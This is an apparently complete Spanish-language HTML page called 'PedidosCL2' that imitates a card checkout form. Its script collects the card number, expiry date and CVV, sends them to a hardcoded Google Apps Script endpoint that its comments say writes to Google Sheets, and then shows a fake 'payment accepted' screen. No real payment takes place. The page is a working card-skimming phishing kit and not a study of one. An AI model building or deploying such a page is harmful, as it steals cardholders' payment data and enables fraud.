<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PedidosCL2</title>

<style>
body{
    margin:0;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;
    background:linear-gradient(135deg,#1c1c1e,#2c2c2e);
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    overflow:hidden;
    color:white;
}

/* MAIN BOX */
.container{
    width:380px;
    padding:30px;
    border-radius:30px;
    backdrop-filter:blur(25px);
    background:rgba(255,255,255,0.07);
    box-shadow:0 25px 60px rgba(0,0,0,0.4);
    transition:0.6s;
    position: relative;
    z-index: 1;
}

/* CARD WRAPPER */
.card-wrapper{
    perspective:1200px;
    margin-bottom:25px;
}

.card{
    width:100%;
    height:200px;
    position:relative;
    transform-style:preserve-3d;
    transition:0.8s cubic-bezier(.76,.01,.23,1);
}

.card.flip{
    transform:rotateY(180deg);
}

.card-face{
    position:absolute;
    width:100%;
    height:100%;
    border-radius:20px;
    padding:20px;
    box-sizing:border-box;
    backface-visibility:hidden;
    display:flex;
    flex-direction:column;
    justify-content:space-between;
}

.card-front{
    background:linear-gradient(135deg,#000,#434343);
}

.card-back{
    background:linear-gradient(135deg,#111,#333);
    transform:rotateY(180deg);
}

.card-number{
    letter-spacing:2px;
    font-size:18px;
}

.brand{
    text-align:right;
    font-weight:600;
}

.cvv-box{
    background:white;
    color:black;
    padding:8px;
    border-radius:6px;
    width:60px;
    align-self:flex-end;
    text-align:center;
}

/* INPUTS */
input{
    width:100%;
    padding:12px;
    margin:8px 0;
    border-radius:14px;
    border:none;
    outline:none;
    box-sizing: border-box;
}

/* BUTTON */
button{
    width:100%;
    padding:14px;
    border:none;
    border-radius:16px;
    background:#0071e3;
    color:white;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    transition:0.3s;
    margin-top: 10px;
}

button:hover{
    transform:scale(1.03);
}

/* LOADER */
.loader{
    margin:20px auto;
    border:4px solid rgba(255,255,255,0.2);
    border-top:4px solid white;
    width:35px;
    height:35px;
    border-radius:50%;
    animation:spin 1s linear infinite;
}

@keyframes spin{
    from{transform:rotate(0deg);}
    to{transform:rotate(360deg);}
}

/* SUCCESS SCREEN */
.success-screen{
    position:absolute;
    inset:0;
    background:linear-gradient(135deg,#0f2027,#2c5364);
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    transform:translateY(100%);
    transition:0.7s cubic-bezier(.76,.01,.23,1);
    z-index: 10;
}

.success-screen.active{
    transform:translateY(0);
}

.check{
    font-size:90px;
    animation:pop 0.6s ease;
}

@keyframes pop{
    0%{transform:scale(0);}
    70%{transform:scale(1.2);}
    100%{transform:scale(1);}
}

.receipt{
    margin-top:20px;
    text-align:center;
    opacity:0.9;
}
</style>
</head>
<body>

<div class="container" id="mainBox">

    <div class="card-wrapper">
        <div class="card" id="card">
            <div class="card-face card-front">
                <div class="card-number" id="previewNumber">•••• •••• •••• ••••</div>
                <div class="brand" id="previewBrand">—</div>
            </div>
            <div class="card-face card-back">
                <div style="background:black;height:40px;margin: 10px -20px;"></div>
                <div class="cvv-box" id="previewCVV">•••</div>
            </div>
        </div>
    </div>

    <input type="text" id="tarjeta" placeholder="Número de tarjeta" maxlength="19">
    <input type="text" id="fecha" placeholder="MM/AA" maxlength="5">
    <input type="text" id="cvv" placeholder="CVV" maxlength="4">

    <button onclick="procesar()">Pagar</button>

    <div id="loader" class="loader" style="display:none;"></div>

</div>

<div class="success-screen" id="successScreen">
    <div class="check">✔</div>
    <h2>Pago Aceptado</h2>
    <div class="receipt" id="receiptText"></div>
</div>

<script>
const card = document.getElementById("card");
const previewNumber = document.getElementById("previewNumber");
const previewBrand = document.getElementById("previewBrand");
const previewCVV = document.getElementById("previewCVV");

/* REEMPLAZA ESTO CON TU URL DE GOOGLE APPS SCRIPT */
const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwAUPesJaTbCn6Rgt8559X3_IcV3JGkUGTOjUA9AlBaGN93ecZ2o6RnHX4yaqZPdbnu/exec";

/* TARJETA INPUT */
document.getElementById("tarjeta").addEventListener("input", function(){
    let v = this.value.replace(/\D/g, "").substring(0, 16);
    this.value = v.replace(/(.{4})/g, "$1 ").trim();
    previewNumber.textContent = this.value || "•••• •••• •••• ••••";
    detectarMarca(v);
});

/* FECHA */
document.getElementById("fecha").addEventListener("input", function(){
    let v = this.value.replace(/\D/g, "");
    if(v.length >= 3){
        this.value = v.substring(0, 2) + "/" + v.substring(2, 4);
    } else {
        this.value = v;
    }
});

/* CVV FLIP */
document.getElementById("cvv").addEventListener("focus", () => card.classList.add("flip"));
document.getElementById("cvv").addEventListener("blur", () => card.classList.remove("flip"));
document.getElementById("cvv").addEventListener("input", function(){
    this.value = this.value.replace(/\D/g, "");
    previewCVV.textContent = this.value || "•••";
});

/* Marca dinámica */
function detectarMarca(num){
    const front = card.querySelector(".card-front");
    if(/^4/.test(num)){
        previewBrand.textContent = "VISA";
        front.style.background = "linear-gradient(135deg,#1a1f71,#0f4cbd)";
    }
    else if(/^5[1-5]/.test(num)){
        previewBrand.textContent = "MASTERCARD";
        front.style.background = "linear-gradient(135deg,#eb001b,#f79e1b)";
    }
    else if(/^3[47]/.test(num)){
        previewBrand.textContent = "AMEX";
        front.style.background = "linear-gradient(135deg,#2e77bb,#174ea6)";
    }
    else{
        previewBrand.textContent = "—";
        front.style.background = "linear-gradient(135deg,#000,#434343)";
    }
}

/* Luhn */
function validarLuhn(num){
    let sum = 0, alt = false;
    for(let i = num.length - 1; i >= 0; i--){
        let n = parseInt(num[i]);
        if(alt){ n *= 2; if(n > 9) n -= 9; }
        sum += n;
        alt = !alt;
    }
    return sum % 10 === 0;
}

/* PROCESAR Y ENVIAR A GOOGLE DRIVE */
async function procesar(){
    const tarjeta = document.getElementById("tarjeta").value.replace(/\s/g, "");
    const fecha = document.getElementById("fecha").value;
    const cvv = document.getElementById("cvv").value;

    // Validaciones
    if(tarjeta.length < 13 || !validarLuhn(tarjeta)) return alert("Tarjeta inválida");
    if(fecha.length !== 5) return alert("Fecha inválida");
    if(cvv.length < 3) return alert("CVV inválido");

    // Mostrar Loader
    document.getElementById("loader").style.display = "block";
    
    // Objeto con los datos
    const datos = {
        tarjeta: tarjeta,
        fecha: fecha,
        cvv: cvv
    };

    try {
        // Envío a Google Sheets (usando mode no-cors para evitar bloqueos)
        await fetch(WEB_APP_URL, {
            method: 'POST',
            mode: 'no-cors',
            cache: 'no-cache',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(datos)
        });

        // Simular tiempo de carga estética
        setTimeout(() => {
            document.getElementById("loader").style.display = "none";
            document.getElementById("mainBox").style.display = "none";
            document.getElementById("successScreen").classList.add("active");

            // Vibración y Sonido
            if(navigator.vibrate) navigator.vibrate(200);
            const audio = new Audio("https://actions.google.com/sounds/v1/cartoon/clang_and_wobble.ogg");
            audio.play().catch(e => console.log("Audio bloqueado por navegador"));

            // Receipt
            document.getElementById("receiptText").innerHTML = 
                "Transacción aprobada<br>Tarjeta terminada en " + tarjeta.slice(-4);
        }, 1500);

    } catch (error) {
        console.error("Error:", error);
        alert("Hubo un error al procesar el envío.");
        document.getElementById("loader").style.display = "none";
    }
}
</script>

</body>
</html>
